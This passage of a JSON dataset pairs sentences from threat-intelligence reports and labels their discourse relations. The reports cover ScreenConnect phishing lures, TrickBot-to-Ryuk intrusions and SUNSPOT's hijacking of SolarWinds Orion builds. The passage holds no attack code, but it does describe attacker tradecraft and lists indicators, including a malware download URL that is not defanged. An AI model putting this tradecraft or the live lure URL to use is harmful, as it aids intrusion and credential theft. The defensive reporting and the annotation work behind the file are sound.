        "S1": "This EXE purports to be a report on Arabic countries and Israel relations but, when executed, actually launches the installation process for ScreenConnect.",
        "S2": "A similar second sample uses .docx file that tries to direct users to ws.onehub[.]com/files/94otjyvd which downloads a ZIP file called \u0644\u062f\u0631\u0627\u0633\u06cc\u0629 .zip.",
        "relation": "ELABORATION"
    },
    {
        "S1": "A similar second sample uses .docx file that tries to direct users to ws.onehub[.]com/files/94otjyvd which downloads a ZIP file called \u0644\u062f\u0631\u0627\u0633\u06cc\u0629 .zip.",
        "S2": "An EXE inside the ZIP of the same name will also begin the ScreenConnect installation process when executed.",
        "relation": "NEXT"
    },
    {
        "S1": "An EXE inside the ZIP of the same name will also begin the ScreenConnect installation process when executed.",
        "S2": "An overview of the infection chain is shown in Figure 1below.",
        "relation": "MISC"
    },
    {
        "S1": "An overview of the infection chain is shown in Figure 1below.",
        "S2": "Static Kitten is distributing at least two URLs that deliver two different ZIP files that are themed to be relevant to government agency employees.",
        "relation": "MISC"
    },
    {
        "S1": "Static Kitten is distributing at least two URLs that deliver two different ZIP files that are themed to be relevant to government agency employees.",
        "S2": "The URLs are distributed through phishing emails with lure and decoy documents.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The URLs are distributed through phishing emails with lure and decoy documents.",
        "S2": "An example lure is shown in Figure 2 below.",
        "relation": "ELABORATION"
    },
    {
        "S1": "An example lure is shown in Figure 2 below.",
        "S2": "The .docx file shown in Figure 2 directly refers to government agency recipients while highlighting concerns about recent Iranian actions, the impact of the US elections, and joint studies by government entities on relations between Arabic countries and Israel.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The .docx file shown in Figure 2 directly refers to government agency recipients while highlighting concerns about recent Iranian actions, the impact of the US elections, and joint studies by government entities on relations between Arabic countries and Israel.",
        "S2": "The actors reference multiple official agencies, including the General Secretariat of the Cooperation Council for the Arab States of the Gulf and the UAE National Media Council, likely in an effort to add the appearance of legitimacy.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The actors reference multiple official agencies, including the General Secretariat of the Cooperation Council for the Arab States of the Gulf and the UAE National Media Council, likely in an effort to add the appearance of legitimacy.",
        "S2": "A full translation of this document can be viewed in Appendix A.",
        "relation": "MISC"
    },
    {
        "S1": "A full translation of this document can be viewed in Appendix A.",
        "S2": "The hyperlink in the .docx file is impersonating the UAE National Media Council, however, the actual link directs to ws.onehub.com/files/7w1372el.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The hyperlink in the .docx file is impersonating the UAE National Media Council, however, the actual link directs to ws.onehub.com/files/7w1372el.",
        "S2": "The second file is a ZIP called \u0627\u0644\u062f\u0631\u0627\u0633\u06cc\u0629 .zip (see Figure 3).",
        "relation": "ELABORATION"
    },
    {
        "S1": "The second file is a ZIP called \u0627\u0644\u062f\u0631\u0627\u0633\u06cc\u0629 .zip (see Figure 3).",
        "S2": "We cannot determine the delivery method for this ZIP, but it is likely similar to the .docx email delivery method of the first download URL.",
        "relation": "ELABORATION"
    },
    {
        "S1": "We cannot determine the delivery method for this ZIP, but it is likely similar to the .docx email delivery method of the first download URL.",
        "S2": "The geopolitical-themed ZIP contains an EXE file with the same name that begins the installation process for ScreenConnect when executed (see Figure 4).",
        "relation": "NEXT"
    },
    {
        "S1": "The geopolitical-themed ZIP contains an EXE file with the same name that begins the installation process for ScreenConnect when executed (see Figure 4).",
        "S2": "Between 2016 and 2020, we have seen ScreenConnect and Onehub used in malicious cyber activity by different, unassociated threat actors",
        "relation": "ELABORATION"
    },
    {
        "S1": "Between 2016 and 2020, we have seenScreenConnect and Onehub used in malicious cyber activity by different, unassociated threat actors",
        "S2": ".",
        "relation": "MISC"
    },
    {
        "S1": ".",
        "S2": "For example, between 2016 and 2019 unknown threat actors targeted IT outsourcing firms, including compromising US-based Cognizant and India-based Wipro.[7]",
        "relation": "MISC"
    },
    {
        "S1": "For example, between 2016 and 2019 unknown threat actors targeted IT outsourcing firms, including compromising US-based Cognizant and India-based Wipro.[7]",
        "S2": "The actors responsible for these attacks used ScreenConnect to connect to endpoints on client networks, enabling them to conduct further lateral movements and automated actions on objectives.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The actors responsible for these attacks used ScreenConnect to connect to endpoints on client networks, enabling them to conduct further lateral movements and automated actions on objectives.",
        "S2": "During an incident impacting Cognizant and their client Maritz Holdings, actors used ScreenConnect to propagate to other connected systems and caused over $1.8 million (USD) in losses through a gift card fraud scheme.[6]",
        "relation": "ELABORATION"
    },
    {
        "S1": "During an incident impacting Cognizant and their client Maritz Holdings, actors used ScreenConnect to propagate to other connected systems and caused over $1.8 million (USD) in losses through a gift card fraud scheme.[6]",
        "S2": "In 2019, another threat group used ConnectWise to execute PowerShell commands in their target environments.",
        "relation": "LIST"
    },
    {
        "S1": "In 2019, another threat group used ConnectWise to execute PowerShell commands in their target environments.",
        "S2": "This lead to the delivery of Zeppelin and other VegaLocker ransomware variants, Vidar information stealer, Cobalt Strike beacons, PS2EXE tools, and banker Trojans.[7]",
        "relation": "NEXT"
    },
    {
        "S1": "This lead to the delivery of Zeppelin and other VegaLocker ransomware variants, Vidar information stealer, Cobalt Strike beacons, PS2EXE tools, and banker Trojans.[7]",
        "S2": "In 2020, ScreenConnect/ConnectWise has been utilized by the cybercriminal group Pinchy Spider (GOLD SOUTHFIELD, GOLD GARDEN, Sodinokibi, REvil, GandCrab) to distribute Sodinokibi ransomware.[8]",
        "relation": "MISC"
    },
    {
        "S1": "In 2020, ScreenConnect/ConnectWise has been utilized by the cybercriminal group Pinchy Spider (GOLD SOUTHFIELD, GOLD GARDEN, Sodinokibi, REvil, GandCrab) to distribute Sodinokibi ransomware.[8]",
        "S2": "Remote desktop management software is a common target and tool used by threat actors because of the wide variety of functionalities they offer.",
        "relation": "MISC"
    },
    {
        "S1": "Remote desktop management software is a common target and tool used by threat actors because of the wide variety of functionalities they offer.",
        "S2": "ScreenConnect offers three primary functions that each contain different valuable features for threat actors.",
        "relation": "MISC"
    },
    {
        "S1": "ScreenConnect offers three primary functions that each contain different valuable features for threat actors.",
        "S2": "ScreenConnect\u2019s capabilities are shown in Table 1 below.",
        "relation": "ELABORATION"
    },
    {
        "S1": "ScreenConnect\u2019s capabilities are shown in Table 1 below.",
        "S2": "When a user tries to double click the executable \u062a\u062d\u0644\u064a\u0644 \u0648\u062f\u0631\u0627\u0633\u0629 \u062a\u0637\u0628\u064a\u0639 \u0627\u0644\u0639\u0644\u0627\u0642\u0627\u062a \u0627\u0644\u062f\u0648\u0644 \u0627\u0644\u0639\u0631\u0628\u064a\u0629 \u0648\u0627\u0633\u0631\u0627\u0626\u064a\u0644 httpsmod.gov.kw.exe (Screenconnect payload), it drops the Microsoft installer file.",
        "relation": "MISC"
    },
    {
        "S1": "When a user tries to double click the executable \u062a\u062d\u0644\u064a\u0644 \u0648\u062f\u0631\u0627\u0633\u0629 \u062a\u0637\u0628\u064a\u0639 \u0627\u0644\u0639\u0644\u0627\u0642\u0627\u062a \u0627\u0644\u062f\u0648\u0644 \u0627\u0644\u0639\u0631\u0628\u064a\u0629 \u0648\u0627\u0633\u0631\u0627\u0626\u064a\u0644 httpsmod.gov.kw.exe (Screenconnect payload), it drops the Microsoft installer file.",
        "S2": "This begins the installation of the client payload onto victim machines.",
        "relation": "NEXT"
    },
    {
        "S1": "This begins the installation of the client payload onto victim machines.",
        "S2": "While the actors attempted to make the installation appear legitimate, closer inspection of the client launch parameters reveals the potential for broader MOFA targeting.",
        "relation": "ELABORATION"
    },
    {
        "S1": "While the actors attempted to make the installation appear legitimate, closer inspection of the client launch parameters reveals the potential for broader MOFA targeting.",
        "S2": "The client service launch parameters are:",
        "relation": "ELABORATION"
    },
    {
        "S1": "The client service launch parameters are:",
        "S2": "While the ScreenConnectclient agent is being installed, the server component expects a connection and the server can identify the client agent through a public key thumbprint.",
        "relation": "MISC"
    },
    {
        "S1": "While the ScreenConnectclient agent is being installed, the server component expects a connection and the server can identify the client agent through a public key thumbprint.",
        "S2": "The thumbprint is a 16 character string located at \"C:\\Program Files (x86)\\ScreenConnect Client (a97eeae2330a1851)\u201d",
        "relation": "ELABORATION"
    },
    {
        "S1": "The thumbprint is a 16 character string located at \"C:\\Program Files (x86)\\ScreenConnect Client (a97eeae2330a1851)\u201d",
        "S2": "Analysis of the authentic launch parameters passed back to the server as part of Screenconnect functionality is shown in Table 2 below.",
        "relation": "MISC"
    },
    {
        "S1": "Analysis of the authentic launch parameters passed back to the server as part of Screenconnect functionality is shown in Table 2 below.",
        "S2": "The main launch parameter that indicates this EXE is designed to target MOFAs are the custom c parameters:",
        "relation": "ELABORATION"
    },
    {
        "S1": "The main launch parameter that indicates this EXE is designed to target MOFAs are the custom c parameters:",
        "S2": "These parameters contain predefined properties that can allow an actor to know which target, or from where, has been infected.",
        "relation": "ELABORATION"
    },
    {
        "S1": "These parameters contain predefined properties that can allow an actor to know which target, or from where, has been infected.",
        "S2": "In this example the infected target is MOFA.",
        "relation": "ELABORATION"
    },
    {
        "S1": "In this example the infected target is MOFA.",
        "S2": "The ScreenConnect launch parameters from \u0627\u0644\u0645\u0646\u062d \u0627\u0644\u062f\u0631\u0627\u0633\u06cc\u0629 .exe is shown below:",
        "relation": "MISC"
    },
    {
        "S1": "The ScreenConnect launch parameters from \u0627\u0644\u0645\u0646\u062d \u0627\u0644\u062f\u0631\u0627\u0633\u06cc\u0629 .exe is shown below:",
        "S2": "The actors again created a custom field parameter, however, this one is kept to a generic MOFA targeting that appears as MFA: &c=mfa&c=mfa.gov",
        "relation": "MISC"
    },
    {
        "S1": "While the use of malicious attachments in spam emails is the most common initial access vector \u2014 determined across multiple CrowdStrike investigations \u2014 the available data from these investigations had either been removed or \u201caged off\u201d the systems (i.e., dispersed due to the passage of time) before CrowdStrike Services could confirm the source.",
        "S2": "In cases where spam attachments could be verified \u2014 once a user has opened the attachment and enabled macro functionality \u2014 a PowerShell script downloads either Emotet, Bokbot or Trickbot, with the end payload being TrickBot.",
        "relation": "NEXT"
    },
    {
        "S1": "In cases where spam attachments could be verified \u2014 once a user has opened the attachment and enabled macro functionality \u2014 a PowerShell script downloads either Emotet, Bokbot or Trickbot, with the end payload being TrickBot.",
        "S2": "Within hours of TrickBot being executed, additional TrickBot modules are installed for network reconnaissance and credential theft.",
        "relation": "NEXT"
    },
    {
        "S1": "Within hours of TrickBot being executed, additional TrickBot modules are installed for network reconnaissance and credential theft.",
        "S2": "Trickbot is installed as a scheduled task, using names like \u201cWinDotNet,\u201d \u201cGoogleTask,\u201d or \u201cSysnetsf\u201d to masquerade as legitimate-appearing processes.",
        "relation": "NEXT"
    },
    {
        "S1": "Trickbot is installed as a scheduled task, using names like \u201cWinDotNet,\u201d \u201cGoogleTask,\u201d or \u201cSysnetsf\u201d to masquerade as legitimate-appearing processes.",
        "S2": "These point to various copies of TrickBot installed in the system, usually within the user profile under %USER_DIR%\\AppData\\Roaming\\ or a subdirectory.",
        "relation": "ELABORATION"
    },
    {
        "S1": "These point to various copies of TrickBot installed in the system, usually within the user profile under %USER_DIR%\\AppData\\Roaming\\ or a subdirectory.",
        "S2": "The subdirectories also use similarly misleading names like \u201cWinDefrag\u201d or \u201cNetSocket\u201d to appear innocuous.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The subdirectories also use similarly misleading names like \u201cWinDefrag\u201d or \u201cNetSocket\u201d to appear innocuous.",
        "S2": "TrickBot may also be installed as a service with names like \u201cControlServiceA\u201d that points to a copy in the system drive root.",
        "relation": "ELABORATION"
    },
    {
        "S1": "TrickBot may also be installed as a service with names like \u201cControlServiceA\u201d that points to a copy in the system drive root.",
        "S2": "WIZARD SPIDER uses a module named NewBCtestnDll64 as a reverse SOCKS proxy that allows for the download and installation of the open source PowerShell Empire post-exploitation framework.",
        "relation": "MISC"
    },
    {
        "S1": "WIZARD SPIDER uses a module named NewBCtestnDll64 as a reverse SOCKS proxy that allows for the download and installation of the open source PowerShell Empire post-exploitation framework.",
        "S2": "These services launch a Base64-encoded PowerShell script that will fetch the full PowerShell Empire code from a remote IP.",
        "relation": "ELABORATION"
    },
    {
        "S1": "These services launch a Base64-encoded PowerShell script that will fetch the full PowerShell Empire code from a remote IP.",
        "S2": "Each instance of the Updater service connects to a single IP address, and multiple versions may be added at the same time, pointing to different IPs and requesting a .php resource.",
        "relation": "MISC"
    },
    {
        "S1": "Each instance of the Updater service connects to a single IP address, and multiple versions may be added at the same time, pointing to different IPs and requesting a .php resource.",
        "S2": "The TrickBot module used for credential harvesting is pwgrab64 .",
        "relation": "MISC"
    },
    {
        "S1": "The TrickBot module used for credential harvesting is pwgrab64 .",
        "S2": "As with all modules launched by the TrickBot core, pwgrab64 is installed into a subfolder, usually named either \u201cmodules\u201d or \u201cdata,\u201d and modified the following registry value:",
        "relation": "ELABORATION"
    },
    {
        "S1": "As with all modules launched by the TrickBot core, pwgrab64 is installed into a subfolder, usually named either \u201cmodules\u201d or \u201cdata,\u201d and modified the following registry value:",
        "S2": "Setting the \u201cUseLogonCredential\u201d value to \u201c1\u201d configures the Windows operating system to store credentials as cleartext in memory, where they can then be retrieved via the use of credential dumping tools.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Setting the \u201cUseLogonCredential\u201d value to \u201c1\u201d configures the Windows operating system to store credentials as cleartext in memory, where they can then be retrieved via the use of credential dumping tools.",
        "S2": "Older versions of the pwgrab module has a limited scope that targets mail clients, web browsers, FileZilla and WinSCP.",
        "relation": "MISC"
    },
    {
        "S1": "Older versions of the pwgrab module has a limited scope that targets mail clients, web browsers, FileZilla and WinSCP.",
        "S2": "Newer versions also dump passwords for applications such as PuTTY, VNC and RDP.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Newer versions also dump passwords for applications such as PuTTY, VNC and RDP.",
        "S2": "In the investigations reviewed by CrowdStrike Services, the UseLogonCredential registry value was observed having been set to \u201c1\u201d on systems throughout the infrastructure, often in conjunction with TrickBot\u2019s first deployment to the host.",
        "relation": "MISC"
    },
    {
        "S1": "In the investigations reviewed by CrowdStrike Services, the UseLogonCredential registry value was observed having been set to \u201c1\u201d on systems throughout the infrastructure, often in conjunction with TrickBot\u2019s first deployment to the host.",
        "S2": "The TrickBot modules used for discovery include networkdll and psfin .",
        "relation": "MISC"
    },
    {
        "S1": "The TrickBot modules used for discovery include networkdll and psfin .",
        "S2": "TrickBot downloads modules for collecting local system information and scouting the network, primarily part of the networkdll module.",
        "relation": "ELABORATION"
    },
    {
        "S1": "TrickBot downloads modules for collecting local system information and scouting the network, primarily part of the networkdll module.",
        "S2": "This module has a battery of command line, WMI and LDAP queries to gather information, and then exfiltrate the data to GRIM SPIDER for review.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This module has a battery of command line, WMI and LDAP queries to gather information, and then exfiltrate the data to GRIM SPIDER for review.",
        "S2": "The psfin module has a similar purpose but specifically searches for financial and point-of-sales indicators.",
        "relation": "LIST"
    },
    {
        "S1": "The psfin module has a similar purpose but specifically searches for financial and point-of-sales indicators.",
        "S2": "Following initial access, GRIM SPIDER focuses on collecting credentials from the compromised hosts and uses existing RDP in an attempt to get a domain administrator account and access to the Windows Domain Controller.",
        "relation": "MISC"
    },
    {
        "S1": "Following initial access, GRIM SPIDER focuses on collecting credentials from the compromised hosts and uses existing RDP in an attempt to get a domain administrator account and access to the Windows Domain Controller.",
        "S2": "This process can take several iterations of harvesting credentials, connecting to new systems and establishing persistence.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This process can take several iterations of harvesting credentials, connecting to new systems and establishing persistence.",
        "S2": "For the incidents observed, this stage of the attack can last from a few days to a few months.",
        "relation": "ELABORATION"
    },
    {
        "S1": "For the incidents observed, this stage of the attack can last from a few days to a few months.",
        "S2": "GRIM SPIDER also has been observed selecting a server to be the primary staging point.",
        "relation": "MISC"
    },
    {
        "S1": "GRIM SPIDER also has been observed selecting a server to be the primary staging point.",
        "S2": "Subsequently, the adversary copies the Microsoft SysInternals PSTools archive to this system, and executes PsExec.exe , a utility that allows them to move laterally and execute commands on other Windows systems within the infrastructure.",
        "relation": "NEXT"
    },
    {
        "S1": "Subsequently, the adversary copies the Microsoft SysInternals PSTools archive to this system, and executes PsExec.exe , a utility that allows them to move laterally and execute commands on other Windows systems within the infrastructure.",
        "S2": "Using this common administrator tool, GRIM SPIDER can traverse the network, remotely installing TrickBot and adding persistence to new targets.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Using this common administrator tool, GRIM SPIDER can traverse the network, remotely installing TrickBot and adding persistence to new targets.",
        "S2": "TrickBot also has the shareDll module for propagating to other hosts using the current, active user credentials.",
        "relation": "LIST"
    },
    {
        "S1": "TrickBot also has the shareDll module for propagating to other hosts using the current, active user credentials.",
        "S2": "Once GRIM SPIDER has gained access to credentials and a Domain Controller, or other host management server, they would then stage the Ryuk ransomware on that system and deploy to targets via PsExec.",
        "relation": "MISC"
    },
    {
        "S1": "Once GRIM SPIDER has gained access to credentials and a Domain Controller, or other host management server, they would then stage the Ryuk ransomware on that system and deploy to targets via PsExec.",
        "S2": "Being the \u201cnoisiest\u201d part of the operation, it is usually accomplished as quickly as possible to minimize chances of detection, as all of the necessary preliminary work has already been completed.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Being the \u201cnoisiest\u201d part of the operation, it is usually accomplished as quickly as possible to minimize chances of detection, as all of the necessary preliminary work has already been completed.",
        "S2": "In observed instances, the deployment and execution of Ryuk occurred in one session, typically lasting 3 to 8 hours.",
        "relation": "ELABORATION"
    },
    {
        "S1": "SUNSPOT was identified on disk with a filename of taskhostsvc.exe (SHA256 Hash: c45c9bda8db1d470f1fd0dcc346dc449839eb5ce9a948c70369230af0b3ef168 ), and internally named taskhostw.exe by its developers.",
        "S2": "It was likely built on 2020-02-20 11:40:02, according to the build timestamp found in the binary, which is consistent with the currently assessed StellarParticle supply chain attack timeline.",
        "relation": "ELABORATION"
    },
    {
        "S1": "It was likely built on 2020-02-20 11:40:02, according to the build timestamp found in the binary, which is consistent with the currently assessed StellarParticle supply chain attack timeline.",
        "S2": "StellarParticle operators maintained the persistence of SUNSPOT by creating a scheduled task set to execute when the host boots.",
        "relation": "ELABORATION"
    },
    {
        "S1": "StellarParticle operators maintained the persistence of SUNSPOT by creating a scheduled task set to execute when the host boots.",
        "S2": "When SUNSPOT executes, it creates a mutex named {12d61a41-4b74-7610-a4d8-3028d2f56395} to ensure only one instance is running.",
        "relation": "NEXT"
    },
    {
        "S1": "When SUNSPOT executes, it creates a mutex named {12d61a41-4b74-7610-a4d8-3028d2f56395} to ensure only one instance is running.",
        "S2": "It then creates an encrypted log file at C:\\Windows\\Temp\\vmware-vmdmp.log .",
        "relation": "NEXT"
    },
    {
        "S1": "It then creates an encrypted log file at C:\\Windows\\Temp\\vmware-vmdmp.log .",
        "S2": "Individual log entries are encrypted with the stream cipher RC4, using the hard-coded key FC F3 2A 83 E5 F6 D0 24 A6 BF CE 88 30 C2 48 E7 .",
        "relation": "NEXT"
    },
    {
        "S1": "Individual log entries are encrypted with the stream cipher RC4, using the hard-coded key FC F3 2A 83 E5 F6 D0 24 A6 BF CE 88 30 C2 48 E7 .",
        "S2": "Throughout execution, SUNSPOT will log errors to this file, along with other deployment information.",
        "relation": "NEXT"
    },
    {
        "S1": "Throughout execution, SUNSPOT will log errors to this file, along with other deployment information.",
        "S2": "Log entries are delineated by the hex string 32 78 A5 E7 1A 79 91 AC and begin with the number of seconds elapsed since the first log line.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Log entries are delineated by the hex string 32 78 A5 E7 1A 79 91 AC and begin with the number of seconds elapsed since the first log line.",
        "S2": "Most log lines corresponding to an error contain a step number (e.g., Step19) requiring knowledge of the malware to understand their meaning.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Most log lines corresponding to an error contain a step number (e.g., Step19) requiring knowledge of the malware to understand their meaning.",
        "S2": "These steps and their mapping to the malware actions are provided at the end of this blog.",
        "relation": "ELABORATION"
    },
    {
        "S1": "These steps and their mapping to the malware actions are provided at the end of this blog.",
        "S2": "The step numbering does not follow the actual execution order, suggesting the calls to the logging function were added by the developers during the creation of the malware as they progressed and needed to focus their efforts on debugging one part of the code.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The step numbering does not follow the actual execution order, suggesting the calls to the logging function were added by the developers during the creation of the malware as they progressed and needed to focus their efforts on debugging one part of the code.",
        "S2": "An extract of a log file generated by SUNSPOT in a test environment is given below.",
        "relation": "ELABORATION"
    },
    {
        "S1": "An extract of a log file generated by SUNSPOT in a test environment is given below.",
        "S2": "The malware then grants itself debugging privileges by modifying its security token to add SeDebugPrivilege .",
        "relation": "MISC"
    },
    {
        "S1": "The malware then grants itself debugging privileges by modifying its security token to add SeDebugPrivilege .",
        "S2": "This step is a prerequisite for the remainder of SUNSPOT\u2019s execution, which involves reading other processes\u2019 memory.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This step is a prerequisite for the remainder of SUNSPOT\u2019s execution, which involves reading other processes\u2019 memory.",
        "S2": "After initialization, SUNSPOT monitors running processes for instances of MsBuild.exe , which is part of Microsoft Visual Studio development tools.",
        "relation": "NEXT"
    },
    {
        "S1": "After initialization, SUNSPOT monitors running processes for instances of MsBuild.exe , which is part of Microsoft Visual Studio development tools.",
        "S2": "Copies of MsBuild.exe are identified by hashing the name of each running process and comparing it to the corresponding value, 0x53D525 .",
        "relation": "ELABORATION"
    },
    {
        "S1": "Copies of MsBuild.exe are identified by hashing the name of each running process and comparing it to the corresponding value, 0x53D525 .",
        "S2": "The hashing algorithm used for the comparison is ElfHash and is provided in Python in Figure 1.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The hashing algorithm used for the comparison is ElfHash and is provided in Python in Figure 1.",
        "S2": "When SUNSPOT finds an MsBuild.exe process, it will spawn a new thread to determine if the Orion software is being built and, if so, hijack the build operation to inject SUNBURST.",
        "relation": "MISC"
    },
    {
        "S1": "When SUNSPOT finds an MsBuild.exe process, it will spawn a new thread to determine if the Orion software is being built and, if so, hijack the build operation to inject SUNBURST.",
        "S2": "The monitoring loop executes every second, allowing SUNSPOT to modify the target source code before it has been read by the compiler.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The monitoring loop executes every second, allowing SUNSPOT to modify the target source code before it has been read by the compiler.",
        "S2": "Although the mutex created during the initialization should already prevent multiple process monitoring loops from running, the malware checks for the presence of a second mutex \u2014 {56331e4d-76a3-0390-a7ee-567adf5836b7} .",
        "relation": "ELABORATION"
    },
    {
        "S1": "Although the mutex created during the initialization should already prevent multiple process monitoring loops from running, the malware checks for the presence of a second mutex \u2014 {56331e4d-76a3-0390-a7ee-567adf5836b7} .",
        "S2": "If this mutex is found, the backdoor interprets it as a signal to quit, waits for the completion of its currently running backdoor injection threads, and exits.",
        "relation": "IF_ELSE"
    },
    {
        "S1": "If this mutex is found, the backdoor interprets it as a signal to quit, waits for the completion of its currently running backdoor injection threads, and exits.",
        "S2": "This mutex was likely intended to be used by StellarParticle operators to discreetly stop the malware, instead of using a riskier method such as killing the process.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This mutex was likely intended to be used by StellarParticle operators to discreetly stop the malware, instead of using a riskier method such as killing the process.",
        "S2": "Stopping SUNSPOT in the middle of its operation could result in unfinished tampering of the Orion source code, and lead to Orion build errors that SolarWinds developers would investigate, revealing the adversary\u2019s presence.",
        "relation": "MISC"
    },
    {
        "S1": "Stopping SUNSPOT in the middle of its operation could result in unfinished tampering of the Orion source code, and lead to Orion build errors that SolarWinds developers would investigate, revealing the adversary\u2019s presence.",
        "S2": "The malware extracts the command-line arguments for each running MsBuild.exe process from the virtual memory using a methodology similar to one publicly documented1.",
        "relation": "MISC"
    },
    {
        "S1": "The malware extracts the command-line arguments for each running MsBuild.exe process from the virtual memory using a methodology similar to one publicly documented1.",
        "S2": "A call to NtQueryInformationProcess allows the adversary to obtain a pointer to the remote process\u2019s Process Environment Block (PEB), which contains a pointer to a _RTL_USER_PROCESS_PARAMETERS structure.",
        "relation": "ELABORATION"
    },
    {
        "S1": "A call to NtQueryInformationProcess allows the adversary to obtain a pointer to the remote process\u2019s Process Environment Block (PEB), which contains a pointer to a _RTL_USER_PROCESS_PARAMETERS structure.",
        "S2": "The latter is read to get the full command line passed to the MsBuild.exe process.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The latter is read to get the full command line passed to the MsBuild.exe process.",
        "S2": "The command line is then parsed to extract individual arguments, and SUNSPOT looks for the directory path of the Orion software Visual Studio solution.",
        "relation": "NEXT"
    },
    {
        "S1": "The command line is then parsed to extract individual arguments, and SUNSPOT looks for the directory path of the Orion software Visual Studio solution.",
        "S2": "This value is hard-coded in the binary, in an encrypted form using AES128-CBC, whose parameters are given below.",
        "relation": "MISC"
    },
    {
        "S1": "This value is hard-coded in the binary, in an encrypted form using AES128-CBC, whose parameters are given below.",
        "S2": "The same material is used for all of the blobs encrypted with AES in the binary.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The same material is used for all of the blobs encrypted with AES in the binary.",
        "S2": "The key and initialization vector (IV) are not unique and can be independently found in other binary samples of several popular video games.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The key and initialization vector (IV) are not unique and can be independently found in other binary samples of several popular video games.",
        "S2": "It is plausible the material was chosen on purpose in order to make static detections on the values impractical.",
        "relation": "ELABORATION"
    },
    {
        "S1": "It is plausible the material was chosen on purpose in order to make static detections on the values impractical.",
        "S2": "When SUNSPOT finds the Orion solution file path in a running MsBuild.exe process, it replaces a source code file in the solution directory, with a malicious variant to inject SUNBURST while Orion is being built.",
        "relation": "MISC"
    },
    {
        "S1": "When SUNSPOT finds the Orion solution file path in a running MsBuild.exe process, it replaces a source code file in the solution directory, with a malicious variant to inject SUNBURST while Orion is being built.",
        "S2": "While SUNSPOT supports replacing multiple files, the identified copy only replaces InventoryManager.cs .",
        "relation": "ELABORATION"
    },
    {
        "S1": "While SUNSPOT supports replacing multiple files, the identified copy only replaces InventoryManager.cs .",
        "S2": "The malicious source code for SUNBURST, along with target file paths, are stored in AES128-CBC encrypted blobs and are protected using the same key and initialization vector.",
        "relation": "MISC"
    },
    {
        "S1": "The malicious source code for SUNBURST, along with target file paths, are stored in AES128-CBC encrypted blobs and are protected using the same key and initialization vector.",
        "S2": "As causing build errors would very likely prompt troubleshooting actions from the Orion developers and lead to the adversary\u2019s discovery, the SUNSPOT developers included a hash verification check, likely to ensure the injected backdoored code is compatible with a known source file, and also avoid replacing the file with garbage data from a failed decryption.",
        "relation": "MISC"
    },
    {
        "S1": "As causing build errors would very likely prompt troubleshooting actions from the Orion developers and lead to the adversary\u2019s discovery, the SUNSPOT developers included a hash verification check, likely to ensure the injected backdoored code is compatible with a known source file, and also avoid replacing the file with garbage data from a failed decryption.",
        "S2": "In the exemplar SUNSPOT sample, the MD5 hash for the backdoored source code is 5f40b59ee2a9ac94ddb6ab9e3bd776ca .",
        "relation": "ELABORATION"
    },
    {
        "S1": "In the exemplar SUNSPOT sample, the MD5 hash for the backdoored source code is 5f40b59ee2a9ac94ddb6ab9e3bd776ca .",
        "S2": "If the decryption of the parameters (target file path and replacement source code) is successful and if the MD5 checks pass, SUNSPOT proceeds with the replacement of the source file content.",
        "relation": "IF_ELSE"
    },
    {
        "S1": "If the decryption of the parameters (target file path and replacement source code) is successful and if the MD5 checks pass, SUNSPOT proceeds with the replacement of the source file content.",
        "S2": "The original source file is copied with a .bk extension (e.g., InventoryManager.bk ), to back up the original content.",
        "relation": "NEXT"
    },
    {
        "S1": "The original source file is copied with a .bk extension (e.g., InventoryManager.bk ), to back up the original content.",
        "S2": "The backdoored source is written to the same filename, but with a .tmp extension (e.g., InventoryManager.tmp ), before being moved using MoveFileEx to the original filename ( InventoryManager.cs ).",
        "relation": "NEXT"
    },
    {
        "S1": "The backdoored source is written to the same filename, but with a .tmp extension (e.g., InventoryManager.tmp ), before being moved using MoveFileEx to the original filename ( InventoryManager.cs ).",
        "S2": "After these steps, the source file backdoored with SUNBURST will then be compiled as part of the standard process.",
        "relation": "NEXT"
    },
    {
        "S1": "After these steps, the source file backdoored with SUNBURST will then be compiled as part of the standard process.",
        "S2": "SUNSPOT appends an entry in the log file with the date and time of the backdoor attempt and waits for the MsBuild.exe process to exit before restoring the original source code and deleting the temporary InventoryManager.bk file.",
        "relation": "NEXT"
    },
    {
        "S1": "SUNSPOT appends an entry in the log file with the date and time of the backdoor attempt and waits for the MsBuild.exe process to exit before restoring the original source code and deleting the temporary InventoryManager.bk file.",
        "S2": "If the Orion solution build is successful, it is backdoored with SUNBURST.",
        "relation": "IF_ELSE"
    },
    {
        "S1": "If the Orion solution build is successful, it is backdoored with SUNBURST.",
        "S2": "The source code of SUNBURST was likely sanitized before being included in SUNSPOT.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The source code of SUNBURST was likely sanitized before being included in SUNSPOT.",
        "S2": "The use of generic variable names, pre-obfuscated strings, and the lack of developer comments or disabled code is similar to what could be obtained after decompiling a backdoored Orion binary, as illustrated in Figure 2, which provides a comparison between the injected source code (top) and a decompilation output (bottom).",
        "relation": "ELABORATION"
    },
    {
        "S1": "The use of generic variable names, pre-obfuscated strings, and the lack of developer comments or disabled code is similar to what could be obtained after decompiling a backdoored Orion binary, as illustrated in Figure 2, which provides a comparison between the injected source code (top) and a decompilation output (bottom).",
        "S2": "In order to remove compilation warnings that could be generated by the adversary\u2019s own code \u2014 which could alert the SolarWinds developers \u2014 StellarParticle made their edits within #pragma warning disable and #pragma warning restore statements, hinting at what parts were edited.",
        "relation": "ELABORATION"
    },
    {
        "S1": "In order to remove compilation warnings that could be generated by the adversary\u2019s own code \u2014 which could alert the SolarWinds developers \u2014 StellarParticle made their edits within #pragma warning disable and #pragma warning restore statements, hinting at what parts were edited.",
